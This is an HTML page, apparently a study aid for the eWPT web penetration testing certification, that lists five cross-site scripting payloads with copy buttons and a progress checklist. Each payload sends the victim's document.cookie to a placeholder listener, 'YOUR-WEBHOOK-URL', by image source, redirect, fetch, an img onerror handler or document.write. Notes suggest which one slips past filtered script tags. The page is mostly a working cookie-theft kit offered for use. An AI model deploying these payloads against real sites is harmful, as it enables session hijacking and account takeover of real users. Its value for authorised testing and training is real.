<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cookie Stealers - eWPT</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a00; color: #e0e0e0; margin: 20px; }
        .header-container { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #ffd700; padding-bottom: 10px; }
        h2 { color: #ffd700; margin: 0; }
        table { width: 100%; border-collapse: collapse; background-color: #262600; margin-top: 20px; table-layout: fixed; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #444; word-wrap: break-word; }
        th { background-color: #333300; color: #ffd700; position: sticky; top: 0; }
        tr:hover { background-color: #3d3d00; }
        .payload-code { font-family: 'Courier New', monospace; color: #fff176; background: #1a1a00; padding: 4px 8px; border-radius: 4px; font-size: 0.85em; display: block; }
        button { background-color: #ffd700; color: #000; border: none; padding: 8px 15px; cursor: pointer; border-radius: 4px; font-weight: bold; min-width: 80px; }
        .reset-btn { background-color: #ff5555; color: white; }
        input[type="text"] { width: 95%; background: #333300; border: 1px solid #555; color: #fff; padding: 6px; }
        .checkbox-col { text-align: center; width: 50px; }
    </style>
</head>
<body>

    <div class="header-container">
        <h2>🍪 Cookie Stealing Payloads</h2>
        <button class="reset-btn" onclick="resetForm()">Clear All</button>
    </div>
    <p>Replace <b>YOUR-WEBHOOK-URL</b> with your listener (e.g., Webhook.site). Payloads are Base64 encoded.</p>

    <table>
        <thead>
            <tr>
                <th style="width: 30px;">#</th>
                <th style="width: 40%;">Payload</th>
                <th style="width: 25%;">Description</th>
                <th style="width: 100px;">Action</th>
                <th class="checkbox-col">Done</th>
                <th>Notes</th>
            </tr>
        </thead>
        <tbody id="tableBody"></tbody>
    </table>

    <script>
        const payloads = [
            { 
                id: 1, 
                p: "<script>new Image().src='https://YOUR-WEBHOOK-URL?c='+document.cookie;<\/script>", 
                d: "Basic Image Tag: Stealthy and works in most contexts." 
            },
            { 
                id: 2, 
                p: "<script>window.location='https://YOUR-WEBHOOK-URL?c='+document.cookie;<\/script>", 
                d: "Redirect: Obvious to user, but very reliable." 
            },
            { 
                id: 3, 
                p: "<script>fetch('https://YOUR-WEBHOOK-URL?c='+document.cookie);<\/script>", 
                d: "Fetch API: Modern background request (XHR alternative)." 
            },
            { 
                id: 4, 
                p: "<img src=x onerror=\"this.src='https://YOUR-WEBHOOK-URL?c='+document.cookie\">", 
                d: "Event Handler Bypass: Useful if <script> tags are filtered." 
            },
            { 
                id: 5, 
                p: "<script>document.write('<img src=\"https://YOUR-WEBHOOK-URL?c=' + document.cookie + '\" />');<\/script>", 
                d: "Document Write: Injects the exfiltration tag into the DOM." 
            }
        ];

        const tableBody = document.getElementById('tableBody');
        payloads.forEach(item => {
            const b64 = btoa(item.p);
            const row = document.createElement('tr');
            row.innerHTML = `
                <td>${item.id}</td>
                <td><span class="payload-code">${escapeHTML(item.p)}</span></td>
                <td>${item.d}</td>
                <td><button onclick="copyEncoded('${b64}')">Copy</button></td>
                <td class="checkbox-col"><input type="checkbox" class="task-check"></td>
                <td><input type="text" class="task-note" placeholder="Log status..."></td>
            `;
            tableBody.appendChild(row);
        });

        function escapeHTML(str) {
            return str.replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":"&#39;"}[m]));
        }

        function copyEncoded(b64) {
            navigator.clipboard.writeText(atob(b64)).then(() => {
                const btn = event.target; btn.innerText = 'Copied!';
                setTimeout(() => { btn.innerText = 'Copy'; }, 800);
            });
        }

        function resetForm() {
            if(confirm("Clear progress?")) {
                document.querySelectorAll('.task-check').forEach(cb => cb.checked = false);
                document.querySelectorAll('.task-note').forEach(nt => nt.value = '');
            }
        }
    </script>
</body>
</html>
